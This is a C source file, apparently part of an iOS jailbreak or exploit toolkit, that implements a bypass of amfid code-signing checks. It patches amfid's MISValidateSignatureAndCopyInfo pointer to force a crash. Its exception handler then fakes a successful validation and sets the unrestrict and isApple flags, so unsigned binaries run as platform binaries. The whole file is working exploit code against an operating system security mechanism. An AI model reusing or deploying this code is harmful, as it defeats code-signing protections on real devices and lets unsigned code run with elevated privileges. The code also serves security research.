/*
 * Amfid codesigning bypass
 * ------------------------
 *
 *  In order to load and run unsigned code, we patch amfid to allow us to intercept the kernel's
 *  callout to amfid's verify_code_directory service routine. This code is heavily based on the
 *  implementation in Ian Beer's triple_fetch project:
 *  https://bugs.chromium.org/p/project-zero/issues/detail?id=1247
 *
 */
#include "blanket/amfid/amfid_codesign_bypass.h"

#include "blanket/amfid/cdhash.h"
#include "blanket/log/log.h"
#include "blanket/sandbox_escape/exception_server.h"
#include "blanket/sandbox_escape/threadexec_routines.h"
#include "headers/mach_vm.h"

#include <assert.h>
#include <CoreFoundation/CoreFoundation.h>
#include <dispatch/dispatch.h>
#include <dlfcn.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>

// The path to the amfid binary.
static const char *AMFID_PATH = "/usr/libexec/amfid";

// The address of crash messages.
static const uintptr_t AMFID_CRASH_ADDRESS = 0x626c616e6b6574;

// The execution context in amfid.
static threadexec_t amfid_tx;

// The Mach port on which we will receive exception messages from amfid.
static mach_port_t amfid_exception_port;

// The address in amfid that we patch to hook MISValidateSignatureAndCopyInfo().
static const void *amfid_ptr_MISValidateSignatureAndCopyInfo;

// Addresses of symbols from libmis.dylib.
static const void *MISValidateSignatureAndCopyInfo;
static CFStringRef kMISValidationOptionUniversalFileOffset;
static CFStringRef kMISValidationInfoCdHash;

// Get the address of the MISValidateSignatureAndCopyInfo function and other symbols from
// libmis.dylib. These will be the same across processes since it is in the dyld shared cache.
static bool
find_libmis_symbols() {
	if (MISValidateSignatureAndCopyInfo != NULL) {
		return true;
	}
	// Open libmis.dylib.
	void *libmis = dlopen("libmis.dylib", RTLD_LAZY);
	if (libmis == NULL) {
		WARNING("Could not find %s", "libmis.dylib");
		libmis = RTLD_DEFAULT;
	}
	// Find kMISValidationOptionUniversalFileOffset.
	CFStringRef *CFStringRef_ptr = dlsym(libmis, "kMISValidationOptionUniversalFileOffset");
	if (CFStringRef_ptr == NULL) {
		ERROR("Could not find %s", "kMISValidationOptionUniversalFileOffset");
		goto fail;
	}
	kMISValidationOptionUniversalFileOffset = *CFStringRef_ptr;
	// Find kMISValidationInfoCdHash.
	CFStringRef_ptr = dlsym(libmis, "kMISValidationInfoCdHash");
	if (CFStringRef_ptr == NULL) {
		ERROR("Could not find %s", "kMISValidationInfoCdHash");
		goto fail;
	}
	kMISValidationInfoCdHash = *CFStringRef_ptr;
	// Find MISValidateSignatureAndCopyInfo last.
	MISValidateSignatureAndCopyInfo = dlsym(libmis, "MISValidateSignatureAndCopyInfo");
	if (MISValidateSignatureAndCopyInfo == NULL) {
		ERROR("Could not find %s", "MISValidateSignatureAndCopyInfo");
		goto fail;
	}
	DEBUG_TRACE(2, "%s = %p", "MISValidateSignatureAndCopyInfo",
		    MISValidateSignatureAndCopyInfo);
	// Clean up.
fail:
	if (libmis != RTLD_DEFAULT) {
		dlclose(libmis);
	}
	return (MISValidateSignatureAndCopyInfo != NULL);
}

// Create a threadexec execution context inside amfid.
static bool
create_amfid_threadexec(threadexec_t priv_tx) {
	pid_t amfid_pid;
	size_t pid_count = 1;
	bool ok = threadexec_pids_for_path(priv_tx, AMFID_PATH, &amfid_pid, &pid_count);
	if (!ok || pid_count == 0) {
		ERROR("Could not find amfid PID");
		return false;
	} else if (pid_count > 1) {
		ERROR("Multiple amfid PIDs");
		return false;
	}
	amfid_tx = threadexec_init_with_threadexec_and_pid(priv_tx, amfid_pid);
	if (amfid_tx == NULL) {
		ERROR("Could not create execution context in amfid");
		return false;
	}
	return true;
}

// Find the cdhash of the specified file.
static bool
find_cdhash(const char *path, size_t fileoff, void *cdhash) {
	bool success = false;
	// First open the file via amfid.
	int fd;
	bool ok = threadexec_file_open(amfid_tx, path, O_RDONLY, 0, NULL, &fd);
	if (!ok || fd < 0) {
		ERROR("Could not open file %s", path);
		goto fail_0;
	}
	// Get the size of the file.
	struct stat st;
	int err = fstat(fd, &st);
	if (err != 0) {
		ERROR("Could not get size of file %s", path);
		goto fail_1;
	}
	size_t size = st.st_size;
	assert(fileoff < size);
	// Map the file into memory.
	DEBUG_TRACE(2, "Mapping %s size %zu offset %zu", path, size, fileoff);
	size -= fileoff;
	uint8_t *file = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, fileoff);
	if (file == MAP_FAILED) {
		ERROR("Could not map file %s", path);
		goto fail_1;
	}
	DEBUG_TRACE(3, "file[0] = %llx", *(uint64_t *)file);
	// Compute the cdhash.
	success = compute_cdhash(file, size, cdhash);
fail_2:
	munmap(file, size);
fail_1:
	close(fd);
fail_0:
	return success;
}

// Set some special output arguments for verify_code_directory().
//
// A better way to do this that doesn't involve hardcoding offsets would be to actually steal the
// AMFID special port, set up our own handler, build the reply message in amfid, send the reply
// port to amfid, and then have amfid send the reply.
static void
verify_code_directory_set_output_parameters(arm_thread_state64_t *state) {
	// x29 is the frame pointer, from which all the stack arguments and local variables are
	// based. x29 + 0x10 points to the unrestrict argument, while x29 + 0x20 points to isApple.
	const uint8_t *x29 = (const uint8_t *)state->__fp;
	const void *unrestrict_stack_arg = x29 + 0x10;
	const void *isApple_stack_arg    = x29 + 0x20;
	// unrestrict is the 9th argument to verify_code_directory(). If set, AMFI will clear the
	// CS_RESTRICT codesigning flag.
	const uint32_t *unrestrict_r;
	bool ok = threadexec_read(amfid_tx, unrestrict_stack_arg,
			&unrestrict_r, sizeof(unrestrict_r));
	if (!ok) {
		goto warn_unrestrict;
	}
	uint32_t unrestrict = 1;
	ok = threadexec_write(amfid_tx, unrestrict_r, &unrestrict, sizeof(unrestrict));
	if (!ok) {
warn_unrestrict:
		WARNING("Could not set %s", "unrestrict");
	}
	// isApple is the 11th argument to verify_code_directory(). If set, AMFI will set the
	// CS_PLATFORM_BINARY codesigning flag. This is useful because it allows us to spawn
	// processes that get treated as platform binaries, allowing us to manipulate task ports
	// directly.
	const uint32_t *isApple_r;
	ok = threadexec_read(amfid_tx, isApple_stack_arg, &isApple_r, sizeof(isApple_r));
	if (!ok) {
		goto warn_isApple;
	}
	uint32_t isApple = 1;
	ok = threadexec_write(amfid_tx, isApple_r, &isApple, sizeof(isApple));
	if (!ok) {
warn_isApple:
		WARNING("Could not set %s", "isApple");
	}
	// Another interesting parameter is argument 7, entitlementsValid. If set, AMFI will set
	// the CS_ENTITLEMENTS_VALIDATED and CS_KILL flags.
}

// Perform the fake implementation of MISValidateSignatureAndCopyInfo(). This implementation is
// derived directly from Ian Beer's triple_fetch.
static bool
fake_MISValidateSignatureAndCopyInfo(arm_thread_state64_t *state) {
	// Do a little bit of magic. ;)
	verify_code_directory_set_output_parameters(state);
	// Get the arguments.
	CFStringRef path_r = (CFStringRef) state->__x[0];
	CFDictionaryRef options_r = (CFDictionaryRef) state->__x[1];
	CFDictionaryRef *info_r = (CFDictionaryRef *) state->__x[2];
	DEBUG_TRACE(2, "Performing: %s(%p, %p, %p)", "MISValidateSignatureAndCopyInfo",
			path_r, options_r, info_r);
	// Call CFStringGetFileSystemRepresentation() to convert the CFString into a C string.
	Boolean result;
	char path[2048];
	bool ok = threadexec_call_cv(amfid_tx, &result, sizeof(result),
			CFStringGetFileSystemRepresentation, 3,
			TX_CARG_LITERAL(CFStringRef, path_r),
			TX_CARG_PTR_DATA_OUT(char *, path, sizeof(path)),
			TX_CARG_LITERAL(CFIndex, sizeof(path)));
	if (!ok || !result) {
		ERROR("Could not convert CFString");
		goto fail_0;
	}
	DEBUG_TRACE(1, "Amfid: validating %s", path);
	// Get the file offset for fat binaries.
	CFNumberRef fileoff_r;
	ok = threadexec_call_cv(amfid_tx, &fileoff_r, sizeof(fileoff_r),
			CFDictionaryGetValue, 2,
			TX_CARG_LITERAL(CFDictionaryRef, options_r),
			TX_CARG_LITERAL(CFStringRef, kMISValidationOptionUniversalFileOffset));
	if (!ok || fileoff_r == NULL) {
		ERROR("Could not get file offset");
		goto fail_0;
	}
	DEBUG_TRACE(3, "Remote file offset = %p", fileoff_r);
	// Convert the file offset from a CFNumber to an integer.
	long long fileoff;
	ok = threadexec_call_cv(amfid_tx, &result, sizeof(result),
			CFNumberGetValue, 3,
			TX_CARG_LITERAL(CFNumberRef, fileoff_r),
			TX_CARG_LITERAL(CFNumberType, kCFNumberLongLongType),
			TX_CARG_PTR_LITERAL_OUT(long long *, &fileoff));
	if (!ok || !result) {
		ERROR("Could not convert file offset");
		goto fail_0;
	}
	DEBUG_TRACE(2, "File offset: %lld", fileoff);
	// Find the cdhash of the file.
	uint8_t cdhash[CS_CDHASH_LEN];
	ok = find_cdhash(path, fileoff, &cdhash);
	if (!ok) {
		ERROR("Could not compute cdhash of %s", path);
		goto fail_0;
	}
	// Create the CFData object containing the cdhash.
	CFDataRef cdhash_r;
	ok = threadexec_call_cv(amfid_tx, &cdhash_r, sizeof(cdhash_r),
			CFDataCreate, 3,
			TX_CARG_LITERAL(CFAllocatorRef, NULL),
			TX_CARG_PTR_DATA_IN(void *, cdhash, sizeof(cdhash)),
			TX_CARG_LITERAL(size_t, sizeof(cdhash)));
	if (!ok || cdhash_r == NULL) {
		ERROR("Could not create CFData object in amfid");
		goto fail_0;
	}
	// Create the CFDictionary object that will be returned by
	// "MISValidateSignatureAndCopyInfo".
	CFDictionaryRef result_r;
	ok = threadexec_call_cv(amfid_tx, &result_r, sizeof(result_r),
			CFDictionaryCreate, 6,
			TX_CARG_LITERAL(CFAllocatorRef, NULL),
			TX_CARG_PTR_DATA_IN(void **, &kMISValidationInfoCdHash, sizeof(kMISValidationInfoCdHash)),
			TX_CARG_PTR_DATA_IN(void **, &cdhash_r, sizeof(cdhash_r)),
			TX_CARG_LITERAL(CFIndex, 1),
			TX_CARG_LITERAL(CFDictionaryKeyCallBacks *, &kCFTypeDictionaryKeyCallBacks),
			TX_CARG_LITERAL(CFDictionaryValueCallBacks *, &kCFTypeDictionaryValueCallBacks));
	// Release the CFData object created earlier.
	threadexec_call_cv(amfid_tx, NULL, 0,
			CFRelease, 1,
			TX_CARG_LITERAL(void *, cdhash_r));
	// Perform error checking on creating the CFDictionary.
	if (!ok || result_r == NULL) {
		ERROR("Could not create result CFDictionary in amfid");
		goto fail_0;
	}
	// Write the result dictionary to the info parameter.
	ok = threadexec_write(amfid_tx, info_r, &result_r, sizeof(result_r));
	if (!ok) {
		ERROR("Could not write output parameter for amfid");
		goto fail_0;
	}
	// Perform the function return. Return 0 to indicate that no errors were encountered.
	DEBUG_TRACE(1, "Amfid: returning cdhash %02x%02x%02x%02x",
			cdhash[0], cdhash[1], cdhash[2], cdhash[3]);
	state->__x[0] = 0;
	state->__pc = state->__lr;
	return true;
fail_0:
	return false;
}

// Catch and handle an exception message from amfid.
static kern_return_t
amfid_catch_exception(mach_port_t thread, mach_port_t task, exception_type_t exception) {
	INFO("Received exception from amfid");
	// We've received an exception message from amfid. Get the thread state.
	arm_thread_state64_t state;
	mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
	kern_return_t kr = thread_get_state(thread, ARM_THREAD_STATE64,
			(thread_state_t) &state, &count);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not get thread state of thread 0x%x", thread);
		return KERN_FAILURE;
	}
	DEBUG_TRACE(2, "Amfid crashing PC: 0x%016llx", state.__pc);
	if (state.__pc != AMFID_CRASH_ADDRESS) {
		WARNING("Amfid crashing at unknown PC: 0x%llx", state.__pc);
		return KERN_FAILURE;
	}
	bool ok = fake_MISValidateSignatureAndCopyInfo(&state);
	if (!ok) {
		ERROR("Could not perform fake %s", "MISValidateSignatureAndCopyInfo");
		return KERN_FAILURE;
	}
	kr = thread_set_state(thread, ARM_THREAD_STATE64, (thread_state_t) &state,
			ARM_THREAD_STATE64_COUNT);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not set thread state of thread 0x%x", thread);
		return KERN_FAILURE;
	}
	return KERN_SUCCESS;
}

// Repeatedly listen for and handle exception messages from amfid.
static void *
amfid_exception_handler_thread(void *arg) {
	// Loop forever catching exceptions from amfid.
	catch_exception_server(amfid_exception_port, 0, ^bool (
			mach_port_t            thread,
			mach_port_t            task,
			exception_type_t       exception,
			exception_data_t       code,
			mach_msg_type_number_t codeCnt,
			kern_return_t *        result) {
		kern_return_t kr = amfid_catch_exception(thread, task, exception);
		*result = kr;
		if (kr == KERN_SUCCESS) {
			mach_port_deallocate(mach_task_self(), thread);
			mach_port_deallocate(mach_task_self(), task);
		} else {
			WARNING("Cannot handle exception: amfid will crash");
		}
		return false;
	});
	DEBUG_TRACE(1, "Exiting amfid exception handler thread");
	return NULL;
}

// Set up the exception handler for amfid.
static bool
setup_amfid_exception_handler() {
	// Create a receive right (and send right) on which we will listen for amfid's exception
	// message.
	mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
	kern_return_t kr = mach_port_construct(mach_task_self(), &options, 0,
			&amfid_exception_port);
	assert(kr == KERN_SUCCESS);
	// According to a comment from Ian Beer's triple_fetch in the file nsxpc2pc/patch_amfid.c,
	// we can't set amfid's task-level exception handler directly (or, presumably, via
	// ReportCrash), we need to make amfid set it itself. Thus, we will copy our new exception
	// port over to amfid and make it set that port as the exception handler itself.
	bool ok = threadexec_task_set_exception_ports(
			amfid_tx,
			threadexec_task(amfid_tx),
			EXC_MASK_ALL,
			amfid_exception_port,
			EXCEPTION_DEFAULT,
			ARM_THREAD_STATE64);
	if (!ok) {
		ERROR("Could not register exception handler for amfid");
		// The port will be destroyed by amfid_codesign_bypass_remove().
		return false;
	}
	INFO("Registered exception handler for amfid");
	// Now create a dedicated thread to monitor exception messages from amfid.
	pthread_t amfid_thread;
	pthread_create(&amfid_thread, NULL, amfid_exception_handler_thread, NULL);
	pthread_detach(amfid_thread);
	return true;
}

// Find the address at which a binary is loaded in memory. I'd like to use something more robust
// than this.
static bool
find_binary_load_address(threadexec_t process_tx, const void **header, size_t *region_size) {
	// Call mach_vm_region() to get the first mapped address in the task.
	mach_vm_address_t address = 0;
	mach_vm_size_t size;
	struct vm_region_basic_info_64 info;
	mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
	mach_port_t object_r;
	kern_return_t kr;
	bool ok = threadexec_call_cv(process_tx, &kr, sizeof(kr),
			mach_vm_region, 7,
			TX_CARG_LITERAL(vm_map_t, threadexec_task_remote(process_tx)),
			TX_CARG_PTR_LITERAL_INOUT(mach_vm_address_t *, &address),
			TX_CARG_PTR_LITERAL_OUT(mach_vm_size_t *, &size),
			TX_CARG_LITERAL(vm_region_flavor_t, VM_REGION_BASIC_INFO_64),
			TX_CARG_PTR_DATA_OUT(vm_region_info_t, &info, sizeof(info)),
			TX_CARG_PTR_LITERAL_INOUT(mach_msg_type_number_t *, &count),
			TX_CARG_PTR_LITERAL_OUT(mach_port_t *, &object_r));
	if (!ok || kr != KERN_SUCCESS) {
		ERROR("Could not get load address of task 0x%x", threadexec_task(process_tx));
		return false;
	}
	*header = (const void *)address;
	*region_size = size;
	return true;
}

// Patch amfid so that it crashes in verify_code_directory() at MISValidateSignatureAndCopyInfo().
static bool
patch_amfid_validation_to_crash() {
	assert(MISValidateSignatureAndCopyInfo != NULL);
	bool success = false;
	// Find the address of amfid's Mach-O header.
	const void *amfid_header_r;
	size_t amfid_header_size;
	bool ok = find_binary_load_address(amfid_tx, &amfid_header_r, &amfid_header_size);
	if (amfid_header_r == NULL) {
		goto fail_0;
	}
	DEBUG_TRACE(2, "amfid load address: %p, size: %zu", amfid_header_r, amfid_header_size);
	// Copy the header of the amfid binary into a local buffer.
	amfid_header_size = 0x8000; // TODO
	void *amfid_header = malloc(amfid_header_size);
	assert(amfid_header != NULL);
	ok = threadexec_read(amfid_tx, amfid_header_r, amfid_header, amfid_header_size);
	if (!ok) {
		ERROR("Could not read amfid binary header");
		goto fail_1;
	}
	// Search for the MISValidateSignatureAndCopyInfo pointer in the header. This will be in
	// the __la_symbol_ptr segment, which is used by the stubs to jump to the true
	// implementation in the dyld shared cache.
	const void *found = memmem(amfid_header, amfid_header_size,
			&MISValidateSignatureAndCopyInfo, sizeof(MISValidateSignatureAndCopyInfo));
	if (found == NULL) {
		ERROR("Could not find pointer to %s in amfid", "MISValidateSignatureAndCopyInfo");
		goto fail_1;
	}
	size_t offset_MISValidateSignatureAndCopyInfo = (uintptr_t)found - (uintptr_t)amfid_header;
	amfid_ptr_MISValidateSignatureAndCopyInfo =
		(const void *)((uintptr_t)amfid_header_r + offset_MISValidateSignatureAndCopyInfo);
	DEBUG_TRACE(2, "Amfid's MISValidateSignatureAndCopyInfo found at address %p",
			amfid_ptr_MISValidateSignatureAndCopyInfo);
	// Now overwrite the MISValidateSignatureAndCopyInfo pointer with a bogus address to
	// trigger a crash.
	ok = threadexec_write(amfid_tx, amfid_ptr_MISValidateSignatureAndCopyInfo,
			&AMFID_CRASH_ADDRESS, sizeof(AMFID_CRASH_ADDRESS));
	if (!ok) {
		ERROR("Could not overwrite %s pointer in amfid",
				"MISValidateSignatureAndCopyInfo");
		goto fail_1;
	}
	DEBUG_TRACE(2, "Overwrote pointer to %s in amfid", "MISValidateSignatureAndCopyInfo");
	success = true;
fail_1:
	free(amfid_header);
fail_0:
	return success;
}

// Undo the damage from patch_amfid_validation_to_crash().
static void
unpatch_amfid_validation() {
	if (amfid_ptr_MISValidateSignatureAndCopyInfo != NULL) {
		// Restore the original value of the MISValidateSignatureAndCopyInfo pointer.
		bool ok = threadexec_write(amfid_tx, amfid_ptr_MISValidateSignatureAndCopyInfo,
				&MISValidateSignatureAndCopyInfo,
				sizeof(MISValidateSignatureAndCopyInfo));
		if (!ok) {
			WARNING("Could not restore %s pointer in amfid",
					"MISValidateSignatureAndCopyInfo");
		}
		amfid_ptr_MISValidateSignatureAndCopyInfo = NULL;
	}
}

bool
amfid_codesign_bypass_install(threadexec_t priv_tx) {
	bool ok = find_libmis_symbols();
	if (!ok) {
		goto fail_0;
	}
	ok = create_amfid_threadexec(priv_tx);
	if (!ok) {
		goto fail_0;
	}
	ok = setup_amfid_exception_handler();
	if (!ok) {
		goto fail_1;
	}
	ok = patch_amfid_validation_to_crash();
	if (!ok) {
		goto fail_1;
	}
	return true;
fail_1:
	amfid_codesign_bypass_remove();
fail_0:
	ERROR("Could not install amfid codesigning bypass");
	return false;
}

void
amfid_codesign_bypass_remove() {
	DEBUG_TRACE(1, "Removing amfid codesigning bypass");
	unpatch_amfid_validation();
	if (amfid_exception_port != MACH_PORT_NULL) {
		// Ideally we should unregister amfid's exception handler on failure, but I think
		// just destroying the port should do the trick.
		mach_port_destroy(mach_task_self(), amfid_exception_port);
		amfid_exception_port = MACH_PORT_NULL;
	}
	if (amfid_tx != NULL) {
		threadexec_deinit(amfid_tx);
		amfid_tx = NULL;
	}
}
